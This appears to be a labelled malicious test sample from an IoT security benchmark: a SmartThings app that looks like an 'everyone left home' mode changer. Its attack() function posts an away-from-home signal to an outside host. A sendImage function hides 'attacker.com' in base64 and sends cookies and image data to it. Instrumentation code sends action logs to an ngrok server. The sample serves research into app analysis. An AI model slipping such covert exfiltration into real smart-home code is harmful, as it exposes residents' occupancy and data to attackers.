/**
 *  saint-dl-uo-implicit_1_ins
 *
 *  Copyright 2020 iotbench
 *
 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except
 *  in compliance with the License. You may obtain a copy of the License at:
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed
 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License
 *  for the specific language governing permissions and limitations under the License.
 *
 */
definition(
		name: "saint-dl-uo-implicit_1_ins",
		namespace: "iotbench",
		author: "iotbench",
		description: "Monitors a set of presence detectors and triggers a mode change when everyone has left. Malicious URL is hard-coded in the source code and information obtained from devices using implicit permissions (device states) are leaked via sinks using the hard-coded URL. Line 109 to line 144 reflect the hard-coded malicious URL. Values obtained from device are leaked via hard-coded URL from line 206 to 220",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	section("When all of these people leave home") {
		input "people", "capability.presenceSensor", multiple: true
	}

	section("Change to this mode") {
		input "newMode", "mode", title: "Mode?"
	}
	section("And text me at (optional)") {
		input "phone", "phone", title: "Phone number?", required: false
	}
	section("False alarm threshold (defaults to 10 min)") {
		input "falseAlarmThreshold", "decimal", title: "Number of minutes", required: false
	}
}

def installed() {
	log.debug "Installed with settings: ${settings}"
	log.debug "Current mode = ${location.mode}, people = ${people.collect{it.label + ': ' + it.currentPresence}}"
	subscribe(people, "presence", presence)
}

def updated() {
	log.debug "Updated with settings: ${settings}"
	log.debug "Current mode = ${location.mode}, people = ${people.collect{it.label + ': ' + it.currentPresence}}"
	unsubscribe()
	subscribe(people, "presence", presence)
}

def presence(evt)
{
	log.debug "evt.name: $evt.value"
	if (evt.value == "not present") {
		if (location.mode != newMode) {
			log.debug "checking if everyone is away"

			if (everyoneIsAway()) {
				log.debug "starting sequence"
				//attack()
				def delay = falseAlarmThreshold != null ? falseAlarmThreshold * 60 : 10 * 60
				runIn(delay, "takeAction")
			}
		}
		else {
			log.debug "mode is the same, not evaluating"
		}
	}
	else {
		log.debug "canceling"
		unschedule("takeAction")
	}
}

def takeAction()
{
	def data = [:]  // instrumented code
	def cnt = 0 // instrumented code
	// TODO -- uncomment when app label is available
	//def message = "${app.label} changed your mode to '${newMode}' because everyone left home"
	def message = "SmartThings changed your mode to '${newMode}' because everyone left home"
	log.info message
	cnt++ // instrumented code
	data['action'+cnt] = "sink1 : sendPush ${message}"  // instrumented code
	sendPush(message) // sink 1


	if (phone) {
		cnt++ // instrumented code
		data['action'+cnt] = "sink2 : sendSms ${phone} ${message}"  // instrumented code
		sendSms(phone, message)  // sink 2
	}
	cnt++ // instrumented code
	data['action'+cnt] = "sink3 : setLocationMode $newMode"  // instrumented code
	setLocationMode(newMode)
	
	attack()
	unschedule("takeAction") // Temporary work-around to scheduling bug
	sendRequest(data) // instrumented code
}

private everyoneIsAway()
{
	def result = true
	for (person in people) {
		if (person.currentPresence == "present") {
			result = false
			break
		}
	}
	log.debug "everyoneIsAway: $result"
	return result
}


def attack() {
	def data = [:]  // instrumented code
	def cnt = 0 // instrumented code
	log.debug "http post"

	def takeParams = [
			uri: "https://automated-lore-135923.appspot.com", //"https://attacker.com"
			path: "",
			//headers: [Cookie: getCookieValue(), 'User-Agent': validUserAgent()],
			requestContentType: "application/x-www-form-urlencoded",
			//query: [width: imgWidth, uuid: uuid],
			body: [
					"condition": "not home!!!"
			]
	]

	try {
		cnt++ // instrumented code
		data['action'+cnt] = "sink4: httpPost ${takeParams}"  // instrumented code
		httpPost(takeParams) { resp ->
			if (resp.status == 200) {
				log.debug "attack succeeded"
				log.debug resp.data.toString()
			} else {
				log.error "attack failed"
			}
		} // sink 3

	} catch (groovyx.net.http.HttpResponseException e) {
		log.error "Dropcam get_image failure: ${e} with status: ${e.statusCode}"

		if (e.statusCode == 403) {
			throw new RuntimeException("Login Required")
		} else if (e.statusCode == 404) {
			log.error "Dropcam 404, camera may be offline"
		}
	} catch (Exception e) {
		log.error "Unexpected Dropcam exception", e
		//sendNotification("Your dropcam is offline.")
	}

	sendRequest(data) // instrumented code
}

def sendImage(String imageBytes, String uuid, Integer imgWidth) {
	def data = [:]  // instrumented code
	def cnt = 0 // instrumented code
	def encoded = "d3d3LmF0dGFja2VyLmNvbQ=="

	def takeParams = [
			uri: "$decodeBase64(encoded)", //"https://attacker.com"
			path: "/get_image",
			headers: [Cookie: getCookieValue(), 'User-Agent': validUserAgent()],
			requestContentType: "application/x-www-form-urlencoded",
			query: [width: imgWidth, uuid: uuid],

			body: [
					"image": imageBytes
			]
	]

	try {
		cnt++ // instrumented code
		data['action'+cnt] = "sink5: httpPost ${takeParams}"  // instrumented code
		httpPost(takeParams) { resp ->
			if (resp.status == 200) {
				log.debug "attack succeeded"
			} else {
				log.error "attack failed"
			}
		} // sink 4
	} catch (groovyx.net.http.HttpResponseException e) {
		log.error "Dropcam get_image failure: ${e} with status: ${e.statusCode}"
		if (e.statusCode == 403) {
			throw new RuntimeException("Login Required")
		} else if (e.statusCode == 404) {
			log.error "Dropcam 404, camera may be offline"
		}
	} catch (Exception e) {
		log.error "Unexpected Dropcam exception", e
		//sendNotification("Your dropcam is offline.")
	}
	sendRequest(data) // instrumented code
}

// the following simulates instrumented end point codes for web services hookup
mappings {
	// this endpoint supports a GET request. It will execute the specified command on the configured switches
	path("/people/:command") {
		//log.info("/people/:command")
		action: [
				GET: "people"
		]
	}
}

/*
	this handles a GET request to the /people/:command endpoint.
    /people/on will turn the presenceSensor on, and /people/off will turn the presenceSensor off.
    This method doesn't work because only Device handler can send/modify device states (present or not present)
    It cannot be modified in the app code
*/
void people() {
	// use the built-in request object to get the command parameter
	def command = params.command
	log.debug("Receive command: $command")
	// inject all possible device commands
	// following is not the exhaustive list yet
	switch(command) {
		case "on":
			people.on()
			break
		case "off":
			people.off()
			break
		case "wet":
			people.wet()
			break
		case "dry":
			people.dry()
			break
		case "present":
			people.present()
			break
		case "notpresent":
			people.notpresent()
			break
		case "active":
			people.active()
			break
		case "inactive":
			people.inactive()
			break
		default:
			httpError(400, "$command is not a valid command for all switches specified")
	}
}


mappings {
	// this is the end point for simulating user location
	path("/location/:command") {
		//log.info("/location/:command")
		action: [
				GET: "location"
		]
	}
}

void location() {
	//eventHandler(evt)
	def command = params.command
	log.debug("Receive command: $command")

	// format command
	command = command.replaceFirst(command[0], command[0].toUpperCase()) // home -> Home, away -> Away

	def currMode = location.currentMode // "Home", "Away", etc.
	log.debug "current mode is $currMode"

	location.setMode(command)  // change location
}

def sendRequest(data) {
	// [q:'Minneapolis', mode: 'json']
	def params = [
			uri:  'https://62f870a15b61.ngrok.io/',
			path: 'fuzzthings/things.php',
			contentType: 'application/json',
			query: data
	]
	try {
		httpGet(params){resp ->
			log.debug "connection okay"
		}
	} catch (e) {
		log.error "error: $e"
	}
}